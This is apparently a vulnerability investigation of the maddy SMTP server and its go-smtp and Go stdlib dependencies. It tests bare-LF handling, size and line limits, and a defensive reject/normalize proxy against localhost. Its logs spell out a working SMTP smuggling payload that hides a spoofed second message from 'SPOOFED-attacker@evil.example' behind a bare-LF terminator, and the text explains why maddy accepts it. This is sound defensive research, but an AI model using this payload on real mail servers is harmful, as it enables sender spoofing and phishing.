$ # command (Q5b reject, single chunk) - start the reject proxy, then send the payload in ONE send():
$ nohup python3 /tmp/maddy-smtp/proxy.py reject 2524 127.0.0.1 2525 /tmp/maddy-smtp/proxy.log >/tmp/maddy-smtp/proxy_stderr.log 2>&1 & PROXY_PID=$!; wait_port 2524
$ python3 /tmp/maddy-smtp/rawclient.py smuggle 127.0.0.1 2524          # one send() -> proxy rejects at offset 156 before forwarding: forwarded_prefix_bytes=0
$ # proxy (pid=94368, single-chunk): whole payload rejected, nothing forwarded:
proxy[reject pid=94368] listening 127.0.0.1:2524 -> 127.0.0.1:2525 (log=/tmp/maddy-smtp/proxy.log)
proxy[reject pid=94368] c->s bytes [0..325) REJECTED (bare LF at offset 156); NOT forwarded: EHLO client.test<CR><LF>MAIL FROM:<legit@example.com><CR><LF>RCPT TO:<rcpt@example.com><CR><LF>DATA<CR><LF>Subject: first (legit) message<CR><LF><CR><LF>This is the visible first message body.<LF>.<LF>MAIL FROM:<SPOOFED-attacker@evil.example><CR><LF>RCPT TO:<victim@example.com><CR><LF>DATA<CR><LF>Subject: SMUGGLED second message<CR><LF><CR><LF>This body was smuggled past the DATA boundary.<CR><LF>.<CR><LF>
proxy[reject pid=94368] REJECTION: kind=bare LF offset=156 forwarded_prefix_bytes=0

$ # maddy.log for this run: ONLY its 220 greeting (nothing was forwarded):
smtp: 220 test.local ESMTP Service Ready

$ # client: greeting, then the proxy's 500 on the first bare LF:
220 test.local ESMTP Service Ready<CR><LF>
500 5.5.2 bare newline rejected by front proxy (RFC 5321 requires CRLF)<CR><LF>
```

*Case 2 — split chunks* (the client flushes a prefix before the bare LF): the proxy forwards the clean 156-byte prefix (`EHLO`…`DATA`…first body line), so maddy processes `EHLO` -> `250`s -> `incoming` -> `354`; then the proxy rejects bytes `[156..325)` and closes, so maddy sees an **unexpected EOF** and aborts. `forwarded_prefix_bytes=156`, but the sink **still** delivers zero:
```text
$ # command (Q5b reject, split chunks) - SAME reject proxy; the smuggle-split mode flushes the clean 156-byte prefix, pauses, then sends the bare-LF tail as a 2nd chunk:
$ python3 /tmp/maddy-smtp/rawclient.py smuggle-split 127.0.0.1 2524    # two sends -> proxy forwards the clean prefix first: forwarded_prefix_bytes=156
$ # proxy (pid=94800, split-chunk): clean 156-byte prefix FORWARDED, then bytes [156..325) REJECTED:
proxy[reject pid=94800] listening 127.0.0.1:2524 -> 127.0.0.1:2525 (log=/tmp/maddy-smtp/proxy.log)
proxy[reject pid=94800] c->s bytes [0..156) clean, FORWARDED (156): EHLO client.test<CR><LF>MAIL FROM:<legit@example.com><CR><LF>RCPT TO:<rcpt@example.com><CR><LF>DATA<CR><LF>Subject: first (legit) message<CR><LF><CR><LF>This is the visible first message body.
proxy[reject pid=94800] c->s bytes [156..325) REJECTED (bare LF at offset 156); NOT forwarded: <LF>.<LF>MAIL FROM:<SPOOFED-attacker@evil.example><CR><LF>RCPT TO:<victim@example.com><CR><LF>DATA<CR><LF>Subject: SMUGGLED second message<CR><LF><CR><LF>This body was smuggled past the DATA boundary.<CR><LF>.<CR><LF>
proxy[reject pid=94800] REJECTION: kind=bare LF offset=156 forwarded_prefix_bytes=156

$ # maddy.log: processes up to 354, then DATA error 'unexpected EOF' -> aborted (msg_id efaac73a):
smtp: incoming message	{"msg_id":"efaac73a","sender":"legit@example.com","src_host":"client.test","src_ip":"127.0.0.1:51508"}
smtp: 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>
smtp: DATA error	{"msg_id":"efaac73a","reason":"unexpected EOF"}
smtp: aborted	{"msg_id":"efaac73a"}

$ # client: still the proxy's 500 (sink delivered 0):
500 5.5.2 bare newline rejected by front proxy (RFC 5321 requires CRLF)<CR><LF>
```

So the reject proxy's *effect on maddy's progress* is packetization-dependent (nothing past `220` in the single-chunk case; through `354`-then-abort in the split-chunk case), but its *security outcome is invariant*: **zero delivered, both cases, both runs.**

**Control — a canonical message through the reject proxy passes (selectivity).** A fully-canonical message (no bare newlines) is forwarded chunk-by-chunk and delivered normally, confirming the proxy blocks only ambiguous framing, not all traffic:
```text
$ # command (Q5b reject, canonical control) - SAME reject proxy; a fully-canonical message (no bare newlines):
$ python3 /tmp/maddy-smtp/rawclient.py canonical 127.0.0.1 2524        # no bare LF -> forwarded chunk-by-chunk -> 1 delivered
$ # proxy (pid=95231): every clean chunk FORWARDED (EHLO/MAIL/RCPT/DATA/body/.CRLF/QUIT):
proxy[reject pid=95231] listening 127.0.0.1:2524 -> 127.0.0.1:2525 (log=/tmp/maddy-smtp/proxy.log)
proxy[reject pid=95231] c->s bytes [0..18) clean, FORWARDED (18): EHLO client.test<CR><LF>
proxy[reject pid=95231] c->s bytes [18..50) clean, FORWARDED (32): MAIL FROM:<sender@example.com><CR><LF>
proxy[reject pid=95231] c->s bytes [50..78) clean, FORWARDED (28): RCPT TO:<rcpt@example.com><CR><LF>
proxy[reject pid=95231] c->s bytes [78..84) clean, FORWARDED (6): DATA<CR><LF>
proxy[reject pid=95231] c->s bytes [84..215) clean, FORWARDED (131): From: sender@example.com<CR><LF>To: rcpt@example.com<CR><LF>Subject: framing probe<CR><LF><CR><LF>BODYLINE-ONE canonical body.<CR><LF>BODYLINE-TWO second line.<CR><LF>
proxy[reject pid=95231] c->s bytes [215..218) clean, FORWARDED (3): .<CR><LF>
proxy[reject pid=95231] c->s bytes [218..224) clean, FORWARDED (6): QUIT<CR><LF>

$ # maddy: accepted; client: 250 2.0.0 OK: queued:
accepted	{"msg_id":"3c0d213f"}
250 2.0.0 OK: queued<CR><LF>
```

**Contrast & which errors appear/disappear.** normalize = *repair* (no new error surfaces; maddy still accepts — and the smuggle boundary is *made* canonical); reject = *enforcement* (a **new** `500 5.5.2 bare newline rejected …` appears at the client and maddy's `accepted` **disappears** entirely; in the split-chunk sub-case a `DATA error: unexpected EOF` also appears in maddy's log). Selectivity: a canonical message still passes the reject proxy.

**Stability (2 runs).** normalize 2/2 -> **2 accepted + 2 delivered** (run 1 `d956e5db`+`1635808a`, run 2 `7ea30d43`+`ad777aac`); reject single-chunk 2/2 -> **0 accepted + 0 delivered**; reject split-chunk 2/2 -> **0 delivered** (maddy aborts after `354`, msg_id `efaac73a` run 1); canonical-through-reject 2/2 -> **1 accepted + 1 delivered** (run 1 `3c0d213f`, run 2 `c846419d`). No variation observed.

---

### Q6 — The real runtime story: what lingers, and what is expected but never seen

Each edge/error branch is triggered directly (not inferred).

**What lingers on failure — cleared message/envelope vs. persistent connection/session.** On a failed `DATA`, maddy's `Session.Reset` (`smtp.go:L60`) sees a still-live delivery and calls `Session.abort` (`smtp.go:L67-81`), which invokes `delivery.Abort`, logs `s.log.Msg("aborted", …)` (`smtp.go:L72`), clears the **per-message / per-envelope** state — `mailFrom`, `opts`, `msgMeta`, `delivery`, `deliveryErr`, `msgCtx` (`smtp.go:L74-79`) — and ends the message trace with `s.msgTask.End()` (`smtp.go:L80`). Two precise caveats matter here: (1) `abort` does **not** nil `s.msgTask` (only the success path does, `smtp.go:L340`); (2) `abort` does **not** touch the **per-connection / per-session** state that deliberately persists across transactions — `connState` (`smtp.go:L42`), `repeatedMailErrs` (`smtp.go:L43`), `loggedRcptErrors` (`smtp.go:L44`), nor go-smtp's own `Conn.helo` (`conn.go:L29`) / `nbrErrors` (`conn.go:L30`). So the accurate statement is **not** "nothing lingers"; it is: **the message and envelope are cleared on abort, but the connection/session (HELO, error counters, connection state) survives** — which is exactly why a client can begin a fresh transaction on the same connection after an error. This is demonstrated directly:

**Q6 post-error probe — a failed transaction does NOT poison the connection.** Run under the `2K` variant so transaction 1 trips `552`; transaction 2 is a small message on the **same** connection with **no** re-`EHLO`:
```text
$ python3 /tmp/maddy-smtp/rawclient.py posterror 127.0.0.1 2525
$ # client: txn1 (first@example.com) oversize -> 552, then txn2 (second@example.com) on the SAME connection -> 250:
220 test.local ESMTP Service Ready<CR><LF>
MAIL FROM:<first@example.com><CR><LF>
354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF><CR><LF>
552 5.3.4 Maximum message size exceeded (msg ID = 3a59e1f9)<CR><LF>
MAIL FROM:<second@example.com><CR><LF>
354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF><CR><LF>
250 2.0.0 OK: queued<CR><LF>

$ # maddy: txn1 552 -> aborted -> reset; txn2 accepted -> reset; BOTH share src_ip 127.0.0.1:47100 (one connection, no re-EHLO):
smtp: incoming message	{"msg_id":"3a59e1f9","sender":"first@example.com","src_host":"client.test","src_ip":"127.0.0.1:47100"}
smtp: DATA error	{"msg_id":"3a59e1f9","reason":"Maximum message size exceeded"}
smtp: 552 5.3.4 Maximum message size exceeded (msg ID = 3a59e1f9)
smtp: aborted	{"msg_id":"3a59e1f9"}
[debug] smtp: reset
smtp: incoming message	{"msg_id":"e812b821","sender":"second@example.com","src_host":"client.test","src_ip":"127.0.0.1:47100"}
smtp: accepted	{"msg_id":"e812b821"}
[debug] smtp: reset
```
Both transactions share `src_ip 127.0.0.1:47100` (one TCP connection); txn2 (`second@example.com`) is accepted **after** txn1's `552` — the envelope was cleared, the connection was not. Stable across 2 runs (run 2: txn1 `8a071f67` -> 552, txn2 `ab4801a8` -> accepted).

**Q6a — dropped connection mid-`DATA` (what maddy attempts vs. what the client sees).** **Mechanism:** closing the socket after `354` and some body bytes but before any terminator makes `dotReader.Read` hit `io.EOF` on the underlying reader and convert it to `io.ErrUnexpectedEOF` (`reader.go:L340-341`); `Session.Data`'s `wrapErr` logs `s.log.Error("DATA error", …)` (`smtp.go:L317`). **Because the client has already closed the socket, maddy's attempt to send `554` lands on a dead connection** — the `io_debug` tee records the write *attempt*, but the client (gone) never receives it. **(observed).**
```text
$ python3 /tmp/maddy-smtp/rawclient.py dropmid 127.0.0.1 2525
$ # client transcript ENDS at the close — the client never receives any 554:
[C->S partial body then DROP (no terminator)]
partial body with no terminator<CR><LF>
[C->S] connection closed mid-DATA (no <CRLF>.<CRLF> sent)
### rawclient done (mode=dropmid)

$ # maddy log: DATA error 'unexpected EOF', then it ATTEMPTS to write 554 (onto the already-closed socket), then aborts:
smtp: incoming message	{"msg_id":"fbcfc1c8","sender":"sender@example.com","src_host":"client.test","src_ip":"127.0.0.1:41152"}
smtp: DATA error	{"msg_id":"fbcfc1c8","reason":"unexpected EOF"}
smtp: 554 5.0.0 Internal server error (msg ID = fbcfc1c8)
smtp: aborted	{"msg_id":"fbcfc1c8"}
[debug] smtp: reset
```
So maddy **logs/attempts** `554 5.0.0 Internal server error`, but a client that dropped mid-`DATA` observes **no reply**. 0 accepted, 0 delivered, both runs (`fbcfc1c8`, `e5898e16`).

**Q6b — oversize message (correct binary path + full config lifecycle).** **Mechanism:** `max_message_size` maps to go-smtp's `MaxMessageBytes` (`smtp.go:L561`); `newDataReader` arms the limit (`data.go:L56-58`) and the wrapping `dataReader.Read` returns `ErrDataTooLarge` (`552`, `EnhancedCode(5, 3, 4)`, `data.go:L38-42,L66-67`) once the cap is exceeded. Triggered with a **labelled configured-limit variant** (`max_message_size 2K`; the canonical default is 32 MiB, advertised as `SIZE 33554432`). The full lifecycle — stop the canonical server, confirm the port is freed, diff the two configs, start the variant with a readiness gate, run, then **restore** the canonical server — is shown (note the correct binary path `/tmp/maddy-smtp/maddy`, not `./maddy`):
```bash
CANON_PID="$(cat /tmp/maddy-smtp/maddy.pid)"; kill "$CANON_PID"          # stop canonical maddy
for i in $(seq 1 50); do port_free 2525 && break; sleep 0.1; done         # wait until :2525 is freed
diff <(grep -vE '^[[:space:]]*#|^[[:space:]]*$' /tmp/maddy-smtp/maddy.conf)      <(grep -vE '^[[:space:]]*#|^[[:space:]]*$' /tmp/maddy-smtp/maddy-oversize.conf)   # only max_message_size differs
nohup /tmp/maddy-smtp/maddy -config /tmp/maddy-smtp/maddy-oversize.conf > /tmp/maddy-smtp/maddy.log 2>&1 &
OV_PID=$!; echo "$OV_PID" > /tmp/maddy-smtp/maddy.pid; wait_port 2525      # readiness gate
python3 /tmp/maddy-smtp/rawclient.py oversize 127.0.0.1 2525               # ~5580-byte body > 2K
# ... then restore the canonical server:
kill "$OV_PID"; for i in $(seq 1 50); do port_free 2525 && break; sleep 0.1; done
nohup /tmp/maddy-smtp/maddy -config /tmp/maddy-smtp/maddy.conf > /tmp/maddy-smtp/maddy.log 2>&1 &
echo $! > /tmp/maddy-smtp/maddy.pid; wait_port 2525
```
```text
$ # config diff — the ONLY difference is the message-size cap:
5a6
>     max_message_size 2K
$ # oversize server up (EHLO now advertises SIZE 2048); client sends a ~5580-byte body -> 552:
250 SIZE 2048<CR><LF>
552 5.3.4 Maximum message size exceeded (msg ID = 863c56ae)<CR><LF>
$ # maddy log: MaxMessageBytes trips -> DATA error -> 552 -> aborted:
smtp: incoming message	{"msg_id":"863c56ae","sender":"sender@example.com","src_host":"client.test","src_ip":"127.0.0.1:59562"}
smtp: DATA error	{"msg_id":"863c56ae","reason":"Maximum message size exceeded"}
smtp: 552 5.3.4 Maximum message size exceeded (msg ID = 863c56ae)
smtp: aborted	{"msg_id":"863c56ae"}
$ # after restoring the canonical (32 MiB) server, a normal message is accepted and delivered again:
accepted	{"msg_id":"85ad0c08"}
========== DELIVERED MESSAGE #39 from 127.0.0.1:37394 ==========
```
**0 accepted** for the oversize message, both runs (`863c56ae`, `43c9523c`); the client sees `552 5.3.4 Maximum message size exceeded` (the enhanced code matches `ErrDataTooLarge`'s `EnhancedCode(5, 3, 4)`). After restore, the canonical server accepts + delivers again (`85ad0c08`), proving the variant was fully reverted.

**Q6c — over-long line (an honest, read-boundary-dependent distribution).** **Mechanism:** go-smtp's per-line cap `MaxLineLength` defaults to `2000` (`server.go:L76`) and maddy does **not** override it; the `lineLimitReader` returns `ErrTooLongLine` ("smtp: too longer line in input stream", `lengthlimit_reader.go:L8`). **Crucially, `lineLimitReader.Read` uses a *value* receiver (`lengthlimit_reader.go:L21`), so `curLineLength` resets to 0 on *each* `Read` call** — the per-line cap is enforced per-`Read`, not cumulatively across reads. Whether an over-long logical line trips the cap therefore depends on how the client's bytes are chunked into `Read` calls:

*Case 1 — one ~5000-byte line in a single write:* one `Read` sees >2000 bytes with no newline -> `ErrTooLongLine` -> `554`. The client **stays connected** and **does** receive the `554` (and the `221`), unlike the dropped-connection case:
```text
$ python3 /tmp/maddy-smtp/rawclient.py longline 127.0.0.1 2525
$ # client: full sequence including the 554 and the 221 (client stayed connected):
220 test.local ESMTP Service Ready<CR><LF>
250-Hello client.test<CR><LF>
250-PIPELINING<CR><LF>
250-8BITMIME<CR><LF>
250-ENHANCEDSTATUSCODES<CR><LF>
250-SMTPUTF8<CR><LF>
250 SIZE 33554432<CR><LF>
250 2.0.0 Roger, accepting mail from <sender@example.com><CR><LF>
250 2.0.0 I'll make sure <rcpt@example.com> gets this<CR><LF>
354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF><CR><LF>
554 5.0.0 Internal server error (msg ID = 904337bb)<CR><LF>
221 2.0.0 Goodnight and good luck<CR><LF>
$ # maddy: lineLimitReader ErrTooLongLine -> DATA error -> 554 -> aborted:
smtp: incoming message	{"msg_id":"904337bb","sender":"sender@example.com","src_host":"client.test","src_ip":"127.0.0.1:55168"}
smtp: DATA error	{"msg_id":"904337bb","reason":"smtp: too longer line in input stream"}
smtp: 554 5.0.0 Internal server error (msg ID = 904337bb)
smtp: aborted	{"msg_id":"904337bb"}
```
*Case 2 — the same ~5000 bytes split into 1000-byte writes:* each `Read` sees <=1000 bytes (< 2000), `curLineLength` resets each `Read`, the cap is never tripped -> the message is **accepted** and delivered:
```text
$ python3 /tmp/maddy-smtp/rawclient.py longline-split 127.0.0.1 2525
$ # maddy accepts; client 250; sink delivers the message:
accepted	{"msg_id":"cf4d21ce"}
250 2.0.0 OK: queued<CR><LF>
delivered body (unstuffed, 5201 bytes)
```
**Honest distribution:** one-chunk trips `554` (2/2 runs: `904337bb`, `051fb48e`); the split variant is **accepted** (2/2 runs: `cf4d21ce`, `4b55eacd`, 5201-byte delivered body). The outcome is a function of `Read()` chunking (the value-receiver reset), not of the logical line length alone.

**Q6d — the critical ABSENCE (the headline), with a correctly-scoped negative search.** An RFC-conformant server would refuse a bare-LF line / `<LF>.<LF>` end-of-data with a `5xx`. maddy emits **no such rejection** and exposes **no mitigation knob**. The negative search must be scoped correctly — an unscoped `--include=*.md` search is contaminated by **this very document**:
```text
$ # (A) WRONG — broadened with --include=*.md; it matches THIS document, so it returns matches (exit 0), NOT exit 1:
$ grep -rniE --include=*.md 'smuggl' . | wc -l
65   # self-referential count (every match is inside THIS document); the integer drifts with any edit to this file, so the meaningful signal is the exit code below, not the count
$ grep -rniE --include=*.md 'smuggl' . ; echo "exit=$?"
exit=0   # 0 = matched, because blitzy/documentation/maddy_26452dd8dd78.md itself contains 'smuggling'
$ # (B) CORRECT — scope to the canonical maddy SOURCE + top-level config only:
$ grep -rniE 'bare[ _-]?(lf|cr|newline)|smuggl|forbid_bare|smtpd_forbid' internal/ cmd/ pkg/ *.conf ; echo "exit=$?"
exit=1   # (stable across 2 runs)
```
The correctly-scoped source/config search returns **no matches** (`grep` exit `1`, stable ×2): maddy's canonical source and configuration contain **no** bare-newline / smuggling mitigation; the word "smuggling" in the repository lives **only** in this investigation document under `blitzy/documentation/`. Contrast (prose): after the December 2023 SMTP-smuggling disclosure, peers added explicit controls — e.g. Postfix's `smtpd_forbid_bare_newline` with `normalize`/`reject` modes (CVE-2023-51764), with fixes also shipping in Exim and Sendmail. The pinned 2019 go-smtp plus the Go stdlib `dotReader` used by maddy accept bare-LF terminators with no option to normalize or reject them — the RFC-conformant behaviour maddy never exhibits.

---

## 3. Three-layer code-path map — where the boundary is actually decided

The end-of-`DATA` decision is not made in maddy. It is made three layers deep, in the Go standard library. maddy's own code receives an **already-decoded** body reader and never inspects the `.` terminator.

```text
Raw TCP client (byte-controlled payload)
        │  bytes over 127.0.0.1:2525
        ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ LAYER 1 — maddy SMTP endpoint  (internal/endpoint/smtp/smtp.go)           │
│   Session.Data(r io.Reader)  L312   ← r is ALREADY decoded                │
│     └ prepareBody  L283 → textproto.ReadHeader L285;                      │
│         buffer.BufferInMemory L298; GenerateReceived L303; header.Add L307 │
│     └ delivery.Body (msgpipeline.go L307) → Commit (L406)                  │
│         └ smtp_downstream: conn.Data → re-encode CRLF + re-stuff dots      │
│     └ s.log.Msg("accepted", …) L334      (or wrapErr → "DATA error" L317) │
└─────────────────────────────────────────────────────────────────────────┘
        │  Session.Data(r) is CALLED BY, and r is BUILT BY, Layer 2
        ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ LAYER 2 — go-smtp library  (github.com/emersion/go-smtp@v0.12.1-2019…)    │
│   Conn.handleData  conn.go L498                                           │
│     └ WriteResponse(354, …) L510;  defer c.reset() L512                    │
│     └ r := newDataReader(c)  L519  →  data.go L51: r = c.text.DotReader()  │
│     └ c.Session().Data(r)  L520                                           │
│     └ io.Copy(ioutil.Discard, r)  L521  (drain)                           │
│     └ WriteResponse(250 … OK: queued)  L522                               │
│   Conn.reset  conn.go L694  → fromReceived=false; recipients=nil L700-702 │
│   io.TeeReader(rwc, c.server.Debug)  conn.go L68  → the io_debug transcript │
│   limits: MaxMessageBytes → 552 (data.go); MaxLineLength=2000 (server.go)  │
└─────────────────────────────────────────────────────────────────────────┘
        │  c.text.DotReader() RETURNS a *dotReader from Layer 3
        ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ LAYER 3 — Go stdlib  (net/textproto/reader.go)   ← THE DECISION IS HERE   │
│   dotReader FSM  Read  L323                                               │
│     stateBeginLine → '.' → stateDot           L347-348                     │
│     stateDot       → '\r'→ stateDotCR L358 ; '\n'→ stateEOF  L362-363 ★    │
│     stateDotCR     → '\n'→ stateEOF           L369-370  (canonical .\r\n)  │
│     stateData      → '\r'→ stateCR L390 ; '\n'→ stateBeginLine L394-395 ★  │
│     '\r\n' rewritten to '\n' on decode; leading '.' elided (un-stuffed)   │
│     premature EOF → io.ErrUnexpectedEOF       L340-341                     │
│   ★ = the bare-LF leniency that makes SMTP smuggling possible             │
└─────────────────────────────────────────────────────────────────────────┘
```

| Layer | File (in this container) | Function / struct | Role in the boundary decision |
|-------|--------------------------|-------------------|-------------------------------|
| 1 | `internal/endpoint/smtp/smtp.go` | `Session.Data` L312, `prepareBody` L283 | Consumes the **decoded** body; buffers, adds `Received`, delivers, logs `accepted`/`DATA error`. Never parses `.`. |
| 1 | `internal/buffer/memory.go` | `BufferInMemory` L27 | Reads the decoded body fully into memory. |
| 1 | `internal/target/smtp_downstream/smtp_downstream.go` | `Delivery.Body` L207, `Commit` (`conn.Data`) | Re-encodes decoded body to canonical CRLF + re-stuffs dots on relay. |
| 2 | go-smtp `conn.go` | `Conn.handleData` L498, `Conn.reset` L694, `TeeReader` L68 | Writes `354`, builds the data reader, calls `Session.Data`, drains, replies `250`, resets envelope; tees raw bytes to `io_debug`. |
| 2 | go-smtp `data.go` | `newDataReader` L51 (`c.text.DotReader()` L53), `ErrDataTooLarge` (552) L38 | Wraps the stdlib `DotReader`; enforces `MaxMessageBytes`→`552`. |
| 2 | go-smtp `server.go` / `lengthlimit_reader.go` | `MaxLineLength=2000` L76 / `ErrTooLongLine` L8 | Per-line cap (maddy does not override it). |
| 3 | `net/textproto/reader.go` | `dotReader` + `Read` L323 | **The actual end-of-`DATA` state machine** — decides the terminator, normalizes CRLF, un-stuffs dots, raises `ErrUnexpectedEOF`. |

### Layer 3 — the decision (Go stdlib `net/textproto/reader.go`, `dotReader.Read`)
The complete `DotReader`/`dotReader.Read` region as it exists in this container's Go 1.18.10 stdlib (no logic elided):
```go
func (r *Reader) DotReader() io.Reader {
	r.closeDot()
	r.dot = &dotReader{r: r}
	return r.dot
}

type dotReader struct {
	r     *Reader
	state int
}

// Read satisfies reads by decoding dot-encoded data read from d.r.
func (d *dotReader) Read(b []byte) (n int, err error) {
	// Run data through a simple state machine to
	// elide leading dots, rewrite trailing \r\n into \n,
	// and detect ending .\r\n line.
	const (
		stateBeginLine = iota // beginning of line; initial state; must be zero
		stateDot              // read . at beginning of line
		stateDotCR            // read .\r at beginning of line
		stateCR               // read \r (possibly at end of line)
		stateData             // reading data in middle of line
		stateEOF              // reached .\r\n end marker line
	)
	br := d.r.R
	for n < len(b) && d.state != stateEOF {
		var c byte
		c, err = br.ReadByte()
		if err != nil {
			if err == io.EOF {
				err = io.ErrUnexpectedEOF
			}
			break
		}
		switch d.state {
		case stateBeginLine:
			if c == '.' {
				d.state = stateDot
				continue
			}
			if c == '\r' {
				d.state = stateCR
				continue
			}
			d.state = stateData

		case stateDot:
			if c == '\r' {
				d.state = stateDotCR
				continue
			}
			if c == '\n' {
				d.state = stateEOF
				continue
			}
			d.state = stateData

		case stateDotCR:
			if c == '\n' {
				d.state = stateEOF
				continue
			}
			// Not part of .\r\n.
			// Consume leading dot and emit saved \r.
			br.UnreadByte()
			c = '\r'
			d.state = stateData

		case stateCR:
			if c == '\n' {
				d.state = stateBeginLine
				break
			}
			// Not part of \r\n. Emit saved \r
			br.UnreadByte()
			c = '\r'
			d.state = stateData

		case stateData:
			if c == '\r' {
				d.state = stateCR
				continue
			}
			if c == '\n' {
				d.state = stateBeginLine
			}
		}
		b[n] = c
		n++
	}
	if err == nil && d.state == stateEOF {
		err = io.EOF
	}
	if err != nil && d.r.dot == d {
		d.r.dot = nil
	}
	return
}
```

### Layer 2 — go-smtp `conn.go` `handleData` (writes `354`, builds the reader, drains, replies, resets)
```go
func (c *Conn) handleData(arg string) {
	if arg != "" {
		c.WriteResponse(501, EnhancedCode{5, 5, 4}, "DATA command should not have any arguments")
		return
	}

	if !c.fromReceived || len(c.recipients) == 0 {
		c.WriteResponse(502, EnhancedCode{5, 5, 1}, "Missing RCPT TO command.")
		return
	}

	// We have recipients, go to accept data
	c.WriteResponse(354, EnhancedCode{2, 0, 0}, "Go ahead. End your data with <CR><LF>.<CR><LF>")

	defer c.reset()

	if c.server.LMTP {
		c.handleDataLMTP()
		return
	}

	r := newDataReader(c)
	code, enhancedCode, msg := toSMTPStatus(c.Session().Data(r))
	io.Copy(ioutil.Discard, r) // Make sure all the data has been consumed
	c.WriteResponse(code, enhancedCode, msg)

```

The data reader is the stdlib `DotReader`, and the `MaxMessageBytes`/`552` limit is armed here (go-smtp `data.go`):
```go
var ErrDataTooLarge = &SMTPError{
	Code:         552,
	EnhancedCode: EnhancedCode{5, 3, 4},
	Message:      "Maximum message size exceeded",
}

type dataReader struct {
	r io.Reader

	limited bool
	n       int64 // Maximum bytes remaining
}

func newDataReader(c *Conn) io.Reader {
	dr := &dataReader{
		r: c.text.DotReader(),
	}

	if c.server.MaxMessageBytes > 0 {
		dr.limited = true
		dr.n = int64(c.server.MaxMessageBytes)
	}

```

The raw `io_debug` transcript is produced by the `io.TeeReader` toward `c.server.Debug`, and the envelope is cleared by `Conn.reset` (go-smtp `conn.go`):
```go
	}

	if c.server.Debug != nil {
		rwc = struct {
			io.Reader
			io.Writer
			io.Closer
		}{
			io.TeeReader(rwc.Reader, c.server.Debug),
			io.MultiWriter(rwc.Writer, c.server.Debug),
			rwc.Closer,
		}
	}
```

```go
func (c *Conn) reset() {
	c.locker.Lock()
	defer c.locker.Unlock()

	if c.session != nil {
		c.session.Reset()
	}
	c.fromReceived = false
	c.recipients = nil
}
```

The per-line length cap defaults to `2000` and is enforced by `lineLimitReader` (go-smtp `server.go` + `lengthlimit_reader.go`):
```go
func NewServer(be Backend) *Server {
	return &Server{
		// Doubled maximum line length per RFC 5321 (Section 4.5.3.1.6)
		MaxLineLength: 2000,

		Backend:  be,
```

```go
package smtp

import (
	"errors"
	"io"
)

var ErrTooLongLine = errors.New("smtp: too longer line in input stream")

// lineLimitReader reads from the underlying Reader but restricts
// line length of lines in input stream to a certain length.
//
// If line length exceeds the limit - Read returns ErrTooLongLine
type lineLimitReader struct {
	R         io.Reader
	LineLimit int

	curLineLength int
}

func (r lineLimitReader) Read(b []byte) (int, error) {
	if r.curLineLength > r.LineLimit {
		return 0, ErrTooLongLine
	}

	n, err := r.R.Read(b)
	if err != nil {
		return n, err
	}

	if r.LineLimit == 0 {
		return n, nil
	}

	for _, chr := range b[:n] {
		if chr == '\n' {
			r.curLineLength = 0
		}
		r.curLineLength++

		if r.curLineLength > r.LineLimit {
			return 0, ErrTooLongLine
		}
	}

```

### Layer 1 — maddy `internal/endpoint/smtp/smtp.go` `Session.Data` + `prepareBody`
maddy receives the already-decoded reader `r`; it buffers, generates `Received`, delivers, and logs — but never scans for `.`:
```go
func (s *Session) prepareBody(ctx context.Context, r io.Reader) (textproto.Header, buffer.Buffer, error) {
	bufr := bufio.NewReader(r)
	header, err := textproto.ReadHeader(bufr)
	if err != nil {
		return textproto.Header{}, nil, err
	}

	if s.endp.submission {
		// The MsgMetadata is passed by pointer all the way down.
		if err := s.submissionPrepare(s.msgMeta, &header); err != nil {
			return textproto.Header{}, nil, err
		}
	}

	// TODO: Disk buffering.
	buf, err := buffer.BufferInMemory(bufr)
	if err != nil {
		return textproto.Header{}, nil, err
	}

	received, err := target.GenerateReceived(ctx, s.msgMeta, s.endp.hostname, s.msgMeta.OriginalFrom)
	if err != nil {
		return textproto.Header{}, nil, err
	}
	header.Add("Received", received)

	return header, buf, nil
}

func (s *Session) Data(r io.Reader) error {
	bodyCtx, bodyTask := trace.NewTask(s.msgCtx, "DATA")
	defer bodyTask.End()

	wrapErr := func(err error) error {
		s.log.Error("DATA error", err, "msg_id", s.msgMeta.ID)
		return s.endp.wrapErr(s.msgMeta.ID, !s.opts.UTF8, err)
	}

	header, buf, err := s.prepareBody(bodyCtx, r)
	if err != nil {
		return wrapErr(err)
	}

	if err := s.delivery.Body(bodyCtx, header, buf); err != nil {
		return wrapErr(err)
	}

	if err := s.delivery.Commit(bodyCtx); err != nil {
		return wrapErr(err)
	}

	s.log.Msg("accepted", "msg_id", s.msgMeta.ID)

	// go-smtp will call Reset, but it will call Abort if delivery is non-nil.
	s.delivery = nil
	s.msgCtx = nil
	s.msgTask.End()
	s.msgTask = nil
	s.endp.semaphore.Release()

	return nil
}
```

On any `DATA` failure (dropped connection, oversize, over-long line), maddy's `Session.Reset`/`Session.abort` clears the **per-message and per-envelope** state (`mailFrom`, `opts`, `msgMeta`, `delivery`, `deliveryErr`, `msgCtx`); the **per-connection/session** state (`connState`, error counters, and go-smtp's own `Conn.helo`) deliberately persists across transactions — so the accurate statement is *the message and envelope are cleared, the connection/session is not* (demonstrated by the Q6 post-error probe), not “nothing lingers” (`internal/endpoint/smtp/smtp.go`):
```go
func (s *Session) Reset() {
	if s.delivery != nil {
		s.abort(s.msgCtx)
	}
	s.endp.Log.DebugMsg("reset")
}

func (s *Session) abort(ctx context.Context) {
	s.endp.semaphore.Release()
	if err := s.delivery.Abort(ctx); err != nil {
		s.endp.Log.Error("delivery abort failed", err)
	}
	s.log.Msg("aborted", "msg_id", s.msgMeta.ID)

	s.mailFrom = ""
	s.opts = smtp.MailOptions{}
	s.msgMeta = nil
	s.delivery = nil
	s.deliveryErr = nil
	s.msgCtx = nil
	s.msgTask.End()
}

```


### Layer 1 (outbound) — how the decoded body is re-serialized toward the sink
The bytes captured at the sink are **not** maddy's inbound bytes replayed; they are the buffered, already-decoded body **re-serialized** by the `smtp_downstream` relay. The complete outbound anchor chain (all read-only, cited exactly) is:

- maddy `internal/target/smtp_downstream/smtp_downstream.go`: `Delivery.Body` (`:L207`) opens the buffered body; `Delivery.Commit` (`:L226`) calls `d.conn.Data(ctx, d.hdr, d.body)` (`:L230`).
